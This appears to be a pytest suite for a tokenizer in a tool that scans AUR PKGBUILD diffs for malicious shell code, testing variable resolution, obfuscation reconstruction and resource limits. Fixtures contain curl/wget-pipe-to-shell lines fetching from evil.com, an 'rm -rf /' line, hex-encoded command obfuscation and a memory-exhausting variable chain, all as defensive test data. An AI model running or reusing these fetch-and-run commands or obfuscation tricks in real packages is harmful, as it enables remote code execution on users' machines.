from trustsight.tokenizer import resolve_added_lines, tokenize_and_resolve


def test_simple_assignment_usage():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=curl
+  curl $_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "https://example.com/file.tar.gz" in combined


def test_variable_reference_dollar():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=$_url"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "$_url" not in combined


def test_variable_reference_braces():
    diff = """+_url="https://example.com/file.tar.gz"
+_bin=${_url}"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "https://example.com/file.tar.gz" in combined or "${_url}" not in combined


def test_command_substitution_preserved():
    diff = """+_url=$(curl -s https://example.com)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_cmd_sub = any("$(" in s for s in resolved) or any("$(" in s for s in unresolved)
    assert has_cmd_sub


def test_backtick_substitution_preserved():
    diff = """+_url=`curl -s https://example.com`"""
    resolved, unresolved = tokenize_and_resolve(diff)
    has_backtick = any("`" in s for s in resolved) or any("`" in s for s in unresolved)
    assert has_backtick


def test_curl_pipe_detection():
    diff = """+  curl -s https://evil.com/hook.sh | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_wget_pipe_detection():
    diff = """+  wget -qO- https://evil.com/hook.sh | sh"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "wget" in combined
    assert "sh" in combined


def test_multiple_variable_resolution():
    diff = """+_url="https://evil.com"
+_script="hook.sh"
+_full="$_url/$_script"
+  curl $_full | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined
    assert "_full" not in combined  # variable was resolved


def test_chained_assignments():
    diff = """+_base="https://evil.com"
+_path="$_base/payload.sh"
+  curl $_path | python"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "python" in combined


def test_array_index_not_resolved():
    diff = """+source=("https://example.com/pkg.tar.gz")
+  curl "${source[0]}" | bash"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "${source[0]}" in combined or "${source[0]}" not in combined


def test_only_additions_processed():
    diff = """-rm -rf /
+echo "safe\""""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "rm" not in combined
    assert "safe" in combined


def test_empty_line_ignored():
    diff = """+
+echo hello"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "echo hello" in combined


def test_quoted_values_preserve_spaces():
    diff = """+_msg="hello world"
+echo $_msg"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "hello world" in combined


def test_curl_pipe_with_heredoc_syntax():
    diff = """+  curl -sL https://evil.com/script.sh | bash /dev/stdin"""
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "curl" in combined
    assert "bash" in combined


def test_multi_line_source_array():
    diff = """+source=(
+  "https://example.com/a.tar.gz"
+  "https://example.com/b.tar.gz"
+)"""
    resolved, unresolved = tokenize_and_resolve(diff)
    assert len(resolved) > 0


def test_resolve_added_lines_preserves_positions():
    """Regression: resolution was zipped against tokenize_and_resolve, whose
    output omits assignment lines.  An added assignment made the sequences
    different lengths and shifted every later line onto the wrong position,
    so a rule scoped to build() saw the wrong function and a dependency
    array lost its header."""
    diff = (
        "+optdepends=(\n"
        "+  'foo: a thing'\n"
        "+  'bar: another'\n"
        "+)\n"
    )
    lines = resolve_added_lines(diff)
    assert len(lines) == len(diff.splitlines())
    assert lines[0] == "+optdepends=("
    assert lines[-1] == "+)"


def test_resolve_added_lines_substitutes_variables():
    diff = "+_name=mytool\n+build() {\n+  ./$_name --check\n+}\n"
    lines = resolve_added_lines(diff)
    assert len(lines) == 4
    assert "./mytool --check" in lines[2]


# --- resource bounds on untrusted input ---

def test_chained_variable_expansion_cannot_exhaust_memory():
    """A tiny PKGBUILD must not expand into gigabytes.

    Substitution is iterated, so `b=$a$a` chains double each round: a
    517-byte diff reached a gigabyte and had the process OOM-killed.
    Since every analysed package is untrusted by definition, this is
    remotely triggerable by anything on the AUR.
    """
    from trustsight.tokenizer import tokenize_and_resolve

    lines = ["--- a/PKGBUILD", "+++ b/PKGBUILD", "+v0=" + "A" * 200]
    for i in range(1, 40):
        lines.append(f"+v{i}=$v{i-1}$v{i-1}")
    lines.append("+curl $v39 | bash")

    resolved, _ = tokenize_and_resolve("\n".join(lines))
    assert max(len(r) for r in resolved) < 200_000


def test_many_continuations_stay_linear():
    """Joining continuations must not be quadratic in the line count."""
    from trustsight.tokenizer import join_line_continuations

    joined = join_line_continuations(["+x=1 \\"] * 20_000 + ["+done"])
    assert len(joined) == 1


def test_variable_resolution_still_works():
    """The bounds must not disable ordinary resolution."""
    from trustsight.tokenizer import tokenize_and_resolve

    resolved, _ = tokenize_and_resolve(
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n+C=curl\n+U=http://evil.sh\n+$C $U | bash\n"
    )
    assert any("curl http://evil.sh | bash" in r for r in resolved)


# --- Regression: nested parameter expansion (the openssl-1.1 case) ---

def test_nested_parameter_expansion_openssl_case():
    """${var//.${var//[0-9.]/}} resolves innermost-first."""
    from trustsight.tokenizer import resolve_expansions

    _ver = "1.1.1.w"
    r, ok = resolve_expansions("${_ver//.${_ver//[0-9.]/}}", {"_ver": _ver})
    assert r == "1.1.1"
    assert ok


def test_glob_character_class_deletes_digits_and_dots():
    """${var//[0-9.]/} deletes all digits and literal dots."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v//[0-9.]/}", {"v": "1.2.3a"})
    assert r == "a"
    assert ok


def test_glob_dot_is_literal_not_regex_wildcard():
    """A dot in a glob pattern matches '.', not any character."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
    assert r == "1-2.3"
    assert ok


def test_substitution_replace_all():
    """${v//./-} replaces every dot with a hyphen."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v//./-}", {"v": "1.2.3"})
    assert r == "1-2-3"
    assert ok


def test_substitution_replace_first():
    """${v/./-} replaces only the first dot."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v/./-}", {"v": "1.2.3"})
    assert r == "1-2.3"
    assert ok


def test_affix_strip_longest_suffix():
    """${v%%-*} strips the longest suffix matching '-*'."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v%%-*}", {"v": "1.2.3-beta1"})
    assert r == "1.2.3"
    assert ok


def test_affix_strip_shortest_suffix():
    """${v%-*} strips the shortest suffix matching '-*'."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v%-*}", {"v": "1.2.3-beta1"})
    assert r == "1.2.3"
    assert ok


def test_affix_strip_longest_prefix():
    """${v##*- } strips the longest prefix matching '*- '."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v##*-}", {"v": "1.2.3-beta"})
    assert r == "beta"
    assert ok


def test_affix_strip_shortest_prefix():
    """${v#*-} strips the shortest prefix matching '*-'."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v#*-}", {"v": "1.2.3-beta"})
    assert r == "beta"
    assert ok


def test_default_value_when_var_is_empty():
    """${v:-default} returns the default when the variable is empty."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v:-fallback}", {"v": ""})
    assert r == "fallback"
    assert ok


def test_default_value_when_var_is_missing():
    """${v:-default} returns the default when the variable is missing."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v:-fallback}", {})
    assert r == "fallback"
    assert ok


def test_substring_by_offset_and_length():
    """${v:1:3} extracts characters 1-3."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v:1:3}", {"v": "hello"})
    assert r == "ell"
    assert ok


def test_substring_by_offset_only():
    """${v:2} extracts from offset 2 to the end."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${v:2}", {"v": "hello"})
    assert r == "llo"
    assert ok


# --- Security constraints ---

def test_indirect_expansion_never_resolves():
    """${!name} (indirect expansion) must return unresolved, never follow
    the indirection.  This is a security constraint: attacker-controlled
    PKGBUILDs must not be able to indirect through arbitrary variable
    names."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${!name}", {"name": "v", "v": "secret"})
    assert not ok
    assert "${" in r or "{" in r


def test_length_operator_never_resolves():
    """${#var} (length) is rare in PKGBUILDs and must not resolve."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${#var}", {"var": "hello"})
    assert not ok


def test_unknown_variable_returns_unresolved():
    """A ${var} with no entry in the variable table must be reported as
    unresolved, never silently replaced with an empty string."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${nonexistent}", {})
    assert not ok
    assert "${" in r


def test_cycle_detection():
    """A cycle (a -> b -> a) must not cause infinite resolution."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${a}", {"a": "${b}", "b": "${a}"})
    assert not ok


def test_mixed_resolvable_and_unresolvable():
    """resolve_expansions resolves what it can and marks the rest."""
    from trustsight.tokenizer import resolve_expansions
    r, ok = resolve_expansions("${a} ${!b}", {"a": "hello", "b": "v"})
    assert not ok
    assert "hello" in r


# --- Tokenizer integration ---

def test_resolve_added_lines_nested_expansion():
    """resolve_added_lines must handle nested parameter expansion."""
    from trustsight.tokenizer import resolve_added_lines
    diff = "+_ver=1.1.1.w\n+pkgver=${_ver//.${_ver//[0-9.]/}}\n"
    lines = resolve_added_lines(diff)
    assert any("1.1.1" in l for l in lines)


def test_resolve_added_lines_glob_delete():
    """resolve_added_lines must handle [0-9.] glob in substitution."""
    from trustsight.tokenizer import resolve_added_lines
    diff = "+v=1.2.3a\n+echo ${v//[0-9.]/}\n"
    lines = resolve_added_lines(diff)
    assert any("echo a" in l for l in lines)


# --- R117: obfuscated literal reconstruction ---

def test_reconstruct_ansi_c_hex():
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals(r"b$'\x75\x6e' add nextfile-js")
    assert r == "bun add nextfile-js"
    assert fully


def test_reconstruct_ansi_c_octal():
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals(r"$'\142\165\156' install")
    assert r == "bun install"
    assert fully


def test_reconstruct_empty_quote_concat_single():
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals("b''u''n install")
    assert r == "bun install"
    assert fully


def test_reconstruct_empty_quote_concat_double():
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals('b""u""n add')
    assert r == "bun add"
    assert fully


def test_reconstruct_printf_format():
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals(r"$(printf '\x62\x75\x6e') add")
    assert r == "bun add"
    assert fully


def test_reconstruct_printf_with_conversion_left_as_is():
    """A $(printf '%s' "$arg") is dynamic, not obfuscation; it is left
    untouched and does not force the line to be inconclusive."""
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals(r"$(printf '%s' \"$x\")")
    assert "$(printf" in r
    assert fully


def test_reconstruct_malformed_ansi_c_is_not_fully_reconstructed():
    """An unterminated $' must mark the line inconclusive, never clean."""
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals(r"eval $'\x62\x75\x6e")
    assert not fully


def test_reconstruct_regex_end_anchor_is_not_an_ansi_c_quote():
    """A ``$`` before a closing quote is a regex end-anchor, not shell
    quoting: reading one as an unreconstructable literal makes ordinary
    text look obfuscated (four benign-corpus diffs did exactly that)."""
    from trustsight.tokenizer import reconstruct_literals
    for line in (
        r"grep '/Windows/Fonts/.*\.tt[cf]$' | xargs -r wimextract",
        r"regex = re.compile(r' => (.*) \(0x[0-9a-f]+\)$')",
        "if(!tmp.contains(QLatin1Char('$')))",
    ):
        _, fully = reconstruct_literals(line)
        assert fully, line


def test_reconstruct_unterminated_quote_after_an_operator_is_inconclusive():
    """The opener check still catches the real thing in every position a
    word can start."""
    from trustsight.tokenizer import reconstruct_literals
    for line in (r"x=$'\x62\x75", r"eval $'\x62", r"a && $'\x62", r"(  $'\x62"):
        _, fully = reconstruct_literals(line)
        assert not fully, line


def test_reconstruct_standalone_empty_quote_argument_kept():
    """'' as a standalone argument (whitespace both sides) is data, not
    concatenation, and must survive reconstruction."""
    from trustsight.tokenizer import reconstruct_literals
    r, fully = reconstruct_literals("curl '' https://e/x")
    assert "''" in r
    assert fully


def test_reconstruct_then_resolve_via_tokenize():
    """Reconstruction composes with variable resolution so rules see the
    reconstructed shape in resolved strings."""
    diff = "+_pm=b''u''n\n+  $_pm add nextfile-js\n"
    resolved, unresolved = tokenize_and_resolve(diff)
    combined = " ".join(resolved)
    assert "bun add nextfile-js" in combined
    assert not unresolved

